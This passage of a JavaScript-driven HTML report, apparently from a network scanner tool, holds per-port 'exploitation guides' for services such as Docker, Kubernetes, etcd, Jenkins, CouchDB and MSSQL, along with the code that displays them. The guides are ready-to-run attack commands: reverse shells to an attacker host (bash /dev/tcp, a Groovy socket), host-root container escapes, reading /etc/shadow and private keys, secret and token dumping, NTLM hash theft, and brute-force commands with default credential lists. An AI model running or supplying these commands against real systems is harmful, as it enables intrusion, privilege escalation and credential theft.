                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc"]
            },
            2375: {
                name: "Docker API",
                risk: "critical",
                description: "Docker API unencrypted - COMPLETE host compromise via container escape. Mount host filesystem, get root.",
                attacks: [
                    {
                        title: "1. Enumerate Containers & Images",
                        commands: [
                            "docker -H tcp://<ip>:2375 ps -a",
                            "docker -H tcp://<ip>:2375 images",
                            "docker -H tcp://<ip>:2375 info",
                            "curl http://<ip>:2375/containers/json",
                            "curl http://<ip>:2375/images/json"
                        ]
                    },
                    {
                        title: "2. Get Root Shell on Host",
                        commands: [
                            "docker -H tcp://<ip>:2375 run -it -v /:/host alpine chroot /host /bin/bash",
                            "# You now have root on the host!",
                            "cat /host/etc/shadow",
                            "# Add SSH key: echo 'ssh-rsa ...' >> /host/root/.ssh/authorized_keys"
                        ]
                    },
                    {
                        title: "3. Execute Commands in Existing Containers",
                        commands: [
                            "docker -H tcp://<ip>:2375 exec -it <container_id> /bin/sh",
                            "docker -H tcp://<ip>:2375 exec <container_id> cat /etc/passwd"
                        ]
                    },
                    {
                        title: "4. Deploy Reverse Shell Container",
                        commands: [
                            "docker -H tcp://<ip>:2375 run -d --name pwned -v /:/host alpine sh -c 'chroot /host bash -i >& /dev/tcp/<attacker>/4444 0>&1'"
                        ]
                    },
                    {
                        title: "5. Read Sensitive Files",
                        commands: [
                            "docker -H tcp://<ip>:2375 run -v /etc:/etc:ro alpine cat /etc/shadow",
                            "docker -H tcp://<ip>:2375 run -v /root:/root:ro alpine cat /root/.ssh/id_rsa",
                            "docker -H tcp://<ip>:2375 run -v /var:/var:ro alpine cat /var/log/auth.log"
                        ]
                    }
                ],
                credentials: ["No authentication by default"],
                cves: [],
                tools: ["docker CLI", "curl", "Metasploit: use exploit/linux/http/docker_daemon_tcp"],
                refs: ["https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker"]
            },
            2376: {
                name: "Docker API (TLS)",
                risk: "high",
                description: "Docker API with TLS - if you obtain client certificates, same attacks as 2375 apply.",
                attacks: [
                    {
                        title: "1. Check if TLS is Required",
                        commands: [
                            "curl -k https://<ip>:2376/info",
                            "# If error, need client certs"
                        ]
                    },
                    {
                        title: "2. Connect with Certificates (if obtained)",
                        commands: [
                            "docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H tcp://<ip>:2376 ps",
                            "# Then same attacks as port 2375"
                        ]
                    },
                    {
                        title: "3. Search for Leaked Certificates",
                        commands: [
                            "# Check GitHub, Docker configs, backups for:",
                            "# ca.pem, cert.pem, key.pem, ca-key.pem",
                            "# Common paths: ~/.docker/, /etc/docker/certs.d/"
                        ]
                    }
                ],
                credentials: ["Client certificate required"],
                cves: [],
                tools: ["docker CLI with --tls flags", "curl"],
                refs: ["https://docs.docker.com/engine/security/protect-access/"]
            },
            6443: {
                name: "Kubernetes API",
                risk: "critical",
                description: "Kubernetes API - cluster takeover possible. Deploy pods, steal secrets, escape to nodes.",
                attacks: [
                    {
                        title: "1. Check for Anonymous Access",
                        commands: [
                            "kubectl --server=https://<ip>:6443 --insecure-skip-tls-verify get pods",
                            "kubectl --server=https://<ip>:6443 --insecure-skip-tls-verify get namespaces",
                            "curl -k https://<ip>:6443/api/v1/namespaces"
                        ]
                    },
                    {
                        title: "2. Steal Secrets",
                        commands: [
                            "kubectl --server=https://<ip>:6443 --insecure-skip-tls-verify get secrets --all-namespaces",
                            "kubectl --server=https://<ip>:6443 --insecure-skip-tls-verify get secret <name> -o yaml",
                            "# Decode: echo '<base64>' | base64 -d"
                        ]
                    },
                    {
                        title: "3. Deploy Malicious Pod",
                        commands: [
                            "# Create pod.yaml with hostPID, hostNetwork, privileged",
                            "kubectl --server=https://<ip>:6443 --insecure-skip-tls-verify apply -f pod.yaml",
                            "kubectl --server=https://<ip>:6443 --insecure-skip-tls-verify exec -it pwned -- /bin/bash"
                        ]
                    },
                    {
                        title: "4. Escape to Node (Privileged Pod)",
                        commands: [
                            "# In privileged pod:",
                            "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
                            "# Now you're root on the node!"
                        ]
                    },
                    {
                        title: "5. Service Account Token Theft",
                        commands: [
                            "# From any pod, read:",
                            "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
                            "# Use token: kubectl --token=<token> --server=https://<api>:6443 get pods"
                        ]
                    }
                ],
                credentials: ["Anonymous auth often enabled", "Service account tokens in pods"],
                cves: ["CVE-2018-1002105 (Privilege escalation)", "CVE-2019-11247", "CVE-2019-11249"],
                tools: ["kubectl", "kube-hunter", "kubeaudit", "peirates"],
                refs: ["https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes"]
            },
            2379: {
                name: "etcd",
                risk: "critical",
                description: "etcd key-value store - contains ALL Kubernetes secrets in PLAINTEXT. Complete cluster compromise.",
                attacks: [
                    {
                        title: "1. Enumerate All Keys",
                        commands: [
                            "etcdctl --endpoints=http://<ip>:2379 get / --prefix --keys-only",
                            "curl -L http://<ip>:2379/v2/keys/?recursive=true"
                        ]
                    },
                    {
                        title: "2. Dump All Kubernetes Secrets",
                        commands: [
                            "etcdctl --endpoints=http://<ip>:2379 get /registry/secrets --prefix",
                            "# Secrets are base64 encoded, decode them:",
                            "echo '<base64>' | base64 -d"
                        ]
                    },
                    {
                        title: "3. Get Service Account Tokens",
                        commands: [
                            "etcdctl --endpoints=http://<ip>:2379 get /registry/secrets/kube-system --prefix | grep token",
                            "# Use token to authenticate to API server"
                        ]
                    },
                    {
                        title: "4. Extract TLS Certificates",
                        commands: [
                            "etcdctl --endpoints=http://<ip>:2379 get /registry/secrets/kube-system/default-token --prefix",
                            "# Look for ca.crt, token data"
                        ]
                    },
                    {
                        title: "5. Modify Cluster State",
                        commands: [
                            "# Can inject malicious pods, modify RBAC, etc.",
                            "etcdctl --endpoints=http://<ip>:2379 put /registry/pods/... <modified_data>"
                        ]
                    }
                ],
                credentials: ["No authentication by default"],
                cves: [],
                tools: ["etcdctl", "curl"],
                refs: ["https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration#etcd"]
            },
            21: {
                name: "FTP",
                risk: "medium",
                description: "FTP file transfer - cleartext protocol. Check for anonymous access, brute force, upload webshells.",
                attacks: [
                    {
                        title: "1. Anonymous Login",
                        commands: [
                            "ftp <ip>",
                            "# Username: anonymous",
                            "# Password: anonymous or email@example.com",
                            "ls -la",
                            "get <file>"
                        ]
                    },
                    {
                        title: "2. Brute Force Credentials",
                        commands: [
                            "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<ip>",
                            "nmap --script ftp-brute -p 21 <ip>",
                            "medusa -h <ip> -u admin -P passwords.txt -M ftp"
                        ]
                    },
                    {
                        title: "3. Upload Webshell (if writable)",
                        commands: [
                            "ftp <ip>",
                            "cd /var/www/html",
                            "put shell.php",
                            "# Access: http://<ip>/shell.php"
                        ]
                    },
                    {
                        title: "4. Download All Files",
                        commands: [
                            "wget -r ftp://anonymous:anonymous@<ip>/",
                            "# Or in ftp: mget *"
                        ]
                    },
                    {
                        title: "5. Bounce Attack (Port Scan)",
                        commands: [
                            "nmap -Pn -b anonymous@<ftp_ip> <target_ip>"
                        ]
                    }
                ],
                credentials: ["anonymous:anonymous", "anonymous:email@example.com", "ftp:ftp", "admin:admin", "user:user"],
                cves: ["CVE-2010-4221 (ProFTPD)", "CVE-2015-3306 (ProFTPD mod_copy)"],
                tools: ["ftp", "lftp", "wget", "Hydra", "Nmap ftp scripts"],
                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp"]
            },
            23: {
                name: "Telnet",
                risk: "high",
                description: "Telnet remote access - ALL traffic in cleartext including passwords. Easy to sniff and brute force.",
                attacks: [
                    {
                        title: "1. Connect & Try Default Credentials",
                        commands: [
                            "telnet <ip>",
                            "# Try: admin/admin, root/root, cisco/cisco"
                        ]
                    },
                    {
                        title: "2. Brute Force",
                        commands: [
                            "hydra -l admin -P passwords.txt telnet://<ip>",
                            "nmap --script telnet-brute -p 23 <ip>",
                            "medusa -h <ip> -u root -P passwords.txt -M telnet"
                        ]
                    },
                    {
                        title: "3. Sniff Credentials (MITM)",
                        commands: [
                            "# ARP spoof + Wireshark",
                            "arpspoof -i eth0 -t <victim> <gateway>",
                            "wireshark -i eth0 -f 'port 23'",
                            "# Credentials visible in plaintext"
                        ]
                    },
                    {
                        title: "4. Network Device Exploitation",
                        commands: [
                            "# Cisco default: cisco/cisco, admin/admin",
                            "# After login: enable, show running-config"
                        ]
                    }
                ],
                credentials: ["admin:admin", "root:root", "cisco:cisco", "admin:password", "administrator:administrator", "user:user"],
                cves: [],
                tools: ["telnet", "Hydra", "Medusa", "Nmap telnet scripts", "Wireshark"],
                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet"]
            },
            11211: {
                name: "Memcached",
                risk: "medium",
                description: "Memcached cache - dump cached data (sessions, credentials). DDoS amplification possible.",
                attacks: [
                    {
                        title: "1. Get Stats & Dump Keys",
                        commands: [
                            "echo 'stats' | nc <ip> 11211",
                            "echo 'stats items' | nc <ip> 11211",
                            "echo 'stats cachedump 1 100' | nc <ip> 11211",
                            "echo 'stats slabs' | nc <ip> 11211"
                        ]
                    },
                    {
                        title: "2. Retrieve Cached Data",
                        commands: [
                            "echo 'get <key>' | nc <ip> 11211",
                            "# Look for session tokens, credentials, API keys"
                        ]
                    },
                    {
                        title: "3. Dump All Keys & Values",
                        commands: [
                            "memcdump --servers=<ip>",
                            "memccat --servers=<ip> <key>"
                        ]
                    },
                    {
                        title: "4. Session Hijacking",
                        commands: [
                            "# Find session keys",
                            "echo 'stats cachedump 1 1000' | nc <ip> 11211 | grep session",
                            "echo 'get session:<id>' | nc <ip> 11211",
                            "# Use session cookie in browser"
                        ]
                    },
                    {
                        title: "5. DDoS Amplification (UDP)",
                        commands: [
                            "# Send small request, get large response",
                            "# Spoof source IP for reflection attack",
                            "# Up to 50,000x amplification factor"
                        ]
                    }
                ],
                credentials: ["No authentication by default"],
                cves: ["CVE-2018-1000115 (DDoS amplification)"],
                tools: ["nc (netcat)", "memccat", "memcdump", "Nmap: nmap -p 11211 --script memcached-info <ip>"],
                refs: ["https://book.hacktricks.xyz/network-services-pentesting/11211-memcache"]
            },
            5984: {
                name: "CouchDB",
                risk: "high",
                description: "CouchDB NoSQL database - REST API allows full access. Admin party mode = no auth.",
                attacks: [
                    {
                        title: "1. Enumerate Databases",
                        commands: [
                            "curl http://<ip>:5984/",
                            "curl http://<ip>:5984/_all_dbs",
                            "curl http://<ip>:5984/_users/_all_docs"
                        ]
                    },
                    {
                        title: "2. Dump Database Contents",
                        commands: [
                            "curl http://<ip>:5984/<db>/_all_docs",
                            "curl http://<ip>:5984/<db>/_all_docs?include_docs=true",
                            "curl http://<ip>:5984/<db>/<doc_id>"
                        ]
                    },
                    {
                        title: "3. Create Admin User (Admin Party)",
                        commands: [
                            "curl -X PUT http://<ip>:5984/_config/admins/pwned -d 'password'",
                            "# Now authenticate as pwned:password"
                        ]
                    },
                    {
                        title: "4. RCE via CVE-2017-12636",
                        commands: [
                            "# Requires admin access",
                            "curl -X PUT 'http://admin:password@<ip>:5984/_config/query_servers/cmd' -d 'id >/tmp/out'"
                        ]
                    },
                    {
                        title: "5. Privilege Escalation (CVE-2017-12635)",
                        commands: [
                            "curl -X PUT http://<ip>:5984/_users/org.couchdb.user:pwned -H 'Content-Type: application/json' -d '{type:user,name:pwned,roles:[_admin],password:password}'"
                        ]
                    }
                ],
                credentials: ["Admin party (no auth)", "admin:admin", "root:root"],
                cves: ["CVE-2017-12635 (Privilege escalation)", "CVE-2017-12636 (RCE)"],
                tools: ["curl", "Nmap: nmap -p 5984 --script couchdb-stats <ip>"],
                refs: ["https://book.hacktricks.xyz/network-services-pentesting/5984-pentesting-couchdb"]
            },
            22: {
                name: "SSH",
                risk: "info",
                description: "SSH secure shell - generally secure but check for weak passwords, key reuse, version vulnerabilities.",
                attacks: [
                    {
                        title: "1. Banner Grabbing & Version Check",
                        commands: [
                            "nc <ip> 22",
                            "nmap -sV -p 22 <ip>",
                            "ssh-audit <ip>"
                        ]
                    },
                    {
                        title: "2. Brute Force Credentials",
                        commands: [
                            "hydra -l root -P passwords.txt ssh://<ip>",
                            "nmap --script ssh-brute -p 22 <ip>",
                            "medusa -h <ip> -u root -P passwords.txt -M ssh"
                        ]
                    },
                    {
                        title: "3. Username Enumeration (Older OpenSSH)",
                        commands: [
                            "# CVE-2018-15473",
                            "python ssh_user_enum.py <ip> -u root -p 22",
                            "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS <ip>; run'"
                        ]
                    },
                    {
                        title: "4. Check for Key Reuse",
                        commands: [
                            "# Try known/leaked private keys",
                            "ssh -i id_rsa root@<ip>",
                            "# Check Debian weak keys: https://github.com/g0tmi1k/debian-ssh"
                        ]
                    },
                    {
                        title: "5. Post-Auth: Steal Keys & Credentials",
                        commands: [
                            "cat ~/.ssh/id_rsa",
                            "cat ~/.ssh/known_hosts",
                            "cat /etc/shadow",
                            "history"
                        ]
                    }
                ],
                credentials: ["root:root", "root:toor", "admin:admin", "user:user", "root:password"],
                cves: ["CVE-2018-15473 (User enumeration)", "CVE-2016-0777/0778 (Roaming)"],
                tools: ["ssh", "ssh-audit", "Hydra", "Medusa", "Nmap ssh scripts"],
                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh"]
            },
            8080: {
                name: "Jenkins",
                risk: "high",
                description: "Jenkins CI/CD - Script Console allows arbitrary Groovy code execution. Credential theft common.",
                attacks: [
                    {
                        title: "1. Access Script Console (No Auth or Weak Auth)",
                        commands: [
                            "# Navigate to: http://<ip>:8080/script",
                            "# Execute Groovy:",
                            "'whoami'.execute().text",
                            "'cat /etc/passwd'.execute().text"
                        ]
                    },
                    {
                        title: "2. Reverse Shell via Groovy",
                        commands: [
                            "String host='<attacker>';int port=4444;String cmd='/bin/bash';",
                            "Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();",
                            "Socket s=new Socket(host,port);",
                            "InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();",
                            "OutputStream po=p.getOutputStream(),so=s.getOutputStream();",
                            "while(!s.isClosed()){/* stream handling */}"
                        ]
                    },
                    {
                        title: "3. Dump Credentials",
                        commands: [
                            "# In Script Console:",
                            "com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().each{println it.dump()}",
                            "# Or: http://<ip>:8080/credentials/"
                        ]
                    },
                    {
                        title: "4. Read Files via Groovy",
                        commands: [
                            "new File('/etc/passwd').text",
                            "new File('/var/jenkins_home/secrets/master.key').text",
                            "new File('/var/jenkins_home/secrets/hudson.util.Secret').text"
                        ]
                    },
                    {
                        title: "5. Create New Admin User",
                        commands: [
                            "# Via Groovy script to manipulate Jenkins config"
                        ]
                    }
                ],
                credentials: ["admin:admin", "admin:password", "jenkins:jenkins"],
                cves: ["CVE-2019-1003000 (RCE)", "CVE-2018-1000861 (RCE)", "CVE-2017-1000353 (Deserialization)"],
                tools: ["curl", "Browser", "Metasploit jenkins modules"],
                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/jenkins"]
            },
            9000: {
                name: "Portainer",
                risk: "high",
                description: "Portainer Docker management UI - provides easy Docker API access. Same risks as exposed Docker.",
                attacks: [
                    {
                        title: "1. Default/Weak Credentials",
                        commands: [
                            "# Navigate to: http://<ip>:9000",
                            "# Try: admin:admin, admin:portainer, admin:password"
                        ]
                    },
                    {
                        title: "2. Create Privileged Container (via UI)",
                        commands: [
                            "# Go to Containers > Add Container",
                            "# Image: alpine",
                            "# Command: /bin/sh",
                            "# Volumes: Bind /:/host",
                            "# Privileged mode: ON",
                            "# Console: Connect to get root on host"
                        ]
                    },
                    {
                        title: "3. Access Console of Existing Containers",
                        commands: [
                            "# Go to Containers > [container] > Console",
                            "# Search for credentials, keys, configs"
                        ]
                    },
                    {
                        title: "4. Steal Environment Variables",
                        commands: [
                            "# Go to Containers > [container] > Inspect",
                            "# Check Env for passwords, API keys"
                        ]
                    }
                ],
                credentials: ["admin:admin", "admin:portainer", "admin:password"],
                cves: ["CVE-2022-26134"],
                tools: ["Browser", "curl"],
                refs: ["https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-portainer"]
            },
            1433: {
                name: "MSSQL",
                risk: "high",
                description: "Microsoft SQL Server - xp_cmdshell enables OS command execution. Often has sa with weak password.",
                attacks: [
                    {
                        title: "1. Brute Force SA Account",
                        commands: [
                            "hydra -l sa -P passwords.txt mssql://<ip>",
                            "nmap --script ms-sql-brute -p 1433 <ip>",
                            "crackmapexec mssql <ip> -u sa -p passwords.txt"
                        ]
                    },
                    {
                        title: "2. Connect & Enumerate",
                        commands: [
                            "sqsh -S <ip> -U sa -P '<password>'",
                            "SELECT name FROM master.dbo.sysdatabases;",
                            "SELECT * FROM <db>.dbo.sysobjects WHERE xtype='U';",
                            "SELECT * FROM <db>.dbo.<table>;"
                        ]
                    },
                    {
                        title: "3. Enable & Use xp_cmdshell",
                        commands: [
                            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
                            "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
                            "EXEC xp_cmdshell 'whoami';",
                            "EXEC xp_cmdshell 'powershell -e <base64_payload>';"
                        ]
                    },
                    {
                        title: "4. Steal NTLM Hash",
                        commands: [
                            "# Start Responder: responder -I eth0",
                            "EXEC xp_dirtree '\\\\\\\\<attacker>\\\\share';",
                            "# Crack with hashcat -m 5600"
                        ]
                    },
                    {
                        title: "5. Read Files",
                        commands: [
                            "SELECT * FROM OPENROWSET(BULK 'C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts', SINGLE_CLOB) AS Contents;"
                        ]
                    }
                ],
                credentials: ["sa:sa", "sa:password", "sa:P@ssw0rd", "sa:1234", "sa (blank)"],
                cves: ["CVE-2020-0618 (RCE)"],
                tools: ["sqsh", "mssqlclient.py (Impacket)", "CrackMapExec", "SQLMap", "Nmap ms-sql scripts"],
                refs: ["https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server"]
            }
        };

        function showServiceGuide(port) {
            const guide = serviceGuides[port];
            if (!guide) {
                alert('No exploitation guide available for port ' + port);
                return;
            }

            const modal = document.getElementById('serviceGuideModal');
            const content = document.getElementById('serviceGuideContent');

            // Build attacks HTML with command blocks
            let attacksHtml = '';
            if (guide.attacks && guide.attacks.length > 0) {
                attacksHtml = guide.attacks.map(attack => `
                    <div style="margin-bottom: 20px; background: var(--bg-base); border-radius: var(--radius-md); padding: 16px; border: 1px solid var(--border-subtle);">
                        <h5 style="color: var(--color-danger); margin-bottom: 12px; font-size: 14px;">${attack.title}</h5>
                        <div style="background: #0d1117; border-radius: 6px; padding: 12px; overflow-x: auto;">
                            <pre style="margin: 0; color: #c9d1d9; font-family: 'SF Mono', Consolas, monospace; font-size: 12px; line-height: 1.6; white-space: pre-wrap;">${attack.commands.join('\\n')}</pre>
                        </div>
                    </div>
                `).join('');
            }

            let html = `
                <div class="service-guide">
                    <h3 style="display: flex; align-items: center; gap: 12px; margin-bottom: 16px; padding-bottom: 12px; border-bottom: 1px solid var(--border-subtle);">
                        <span class="risk-badge risk-${guide.risk}">${guide.risk.toUpperCase()}</span>
                        <span style="font-size: 20px;">🔓 ${guide.name} Exploitation - Port ${port}</span>
                    </h3>
                    <p style="color: var(--text-secondary); margin-bottom: 24px; line-height: 1.6; font-size: 14px;">${guide.description}</p>

                    <div style="margin-bottom: 24px;">
                        <h4 style="color: var(--color-danger); margin-bottom: 16px; font-size: 16px; display: flex; align-items: center; gap: 8px;">
                            <span>🎯</span> Exploitation Techniques
                        </h4>
                        ${attacksHtml}
                    </div>

                    ${guide.credentials && guide.credentials.length > 0 ? `
                    <div style="margin-bottom: 24px; padding: 16px; background: var(--color-warning-muted); border-radius: var(--radius-md); border: 1px solid rgba(251, 191, 36, 0.3);">
                        <h4 style="color: var(--color-warning); margin-bottom: 12px; font-size: 14px;">🔑 Default Credentials to Try</h4>
                        <div style="display: flex; flex-wrap: wrap; gap: 8px;">
                            ${guide.credentials.map(c => `<code style="background: rgba(0,0,0,0.3); padding: 4px 10px; border-radius: 4px; font-size: 13px; color: var(--color-warning);">${c}</code>`).join('')}
                        </div>
                    </div>
                    ` : ''}

                    ${guide.cves && guide.cves.length > 0 ? `
                    <div style="margin-bottom: 24px;">
                        <h4 style="color: var(--text-secondary); margin-bottom: 12px; font-size: 14px;">🐛 Known CVEs to Check</h4>
                        <div style="display: flex; flex-wrap: wrap; gap: 8px;">
                            ${guide.cves.map(c => `<span style="background: var(--color-danger-muted); color: var(--color-danger); padding: 4px 10px; border-radius: 4px; font-size: 12px;">${c}</span>`).join('')}
                        </div>
                    </div>
                    ` : ''}

                    <div style="margin-bottom: 24px;">
                        <h4 style="color: var(--text-secondary); margin-bottom: 12px; font-size: 14px;">🔧 Tools</h4>
                        <div style="display: flex; flex-wrap: wrap; gap: 8px;">
                            ${guide.tools.map(t => `<span style="background: var(--accent-primary-muted); color: var(--accent-primary); padding: 4px 10px; border-radius: 4px; font-size: 12px;">${t}</span>`).join('')}
                        </div>
                    </div>

                    <div>
                        <h4 style="color: var(--text-secondary); margin-bottom: 12px; font-size: 14px;">📚 References</h4>
                        <ul style="margin: 0; padding-left: 20px;">
                            ${guide.refs.map(r => `<li style="margin-bottom: 6px;"><a href="${r}" target="_blank" style="color: var(--accent-primary); text-decoration: none; word-break: break-all;">${r}</a></li>`).join('')}
                        </ul>
                    </div>
                </div>
            `;

            content.innerHTML = html;
            modal.classList.add('active');
            document.body.style.overflow = 'hidden';
        }

        function closeServiceGuide(event) {
            if (event && event.target !== event.currentTarget && !event.target.classList.contains('modal-close')) {
                return;
            }
            const modal = document.getElementById('serviceGuideModal');
            modal.classList.remove('active');
            document.body.style.overflow = 'auto';
        }

        // Smooth scroll for nav links
        document.querySelectorAll('.nav-item').forEach(link => {
            link.addEventListener('click', function(e) {
                const href = this.getAttribute('href');
                if (href && href.startsWith('#')) {
                    e.preventDefault();
                    document.querySelector(href).scrollIntoView({ behavior: 'smooth' });
                    document.querySelectorAll('.nav-item').forEach(l => l.classList.remove('active'));
                    this.classList.add('active');
                }
            });
        });
    </script>
</body>
</html>
'''
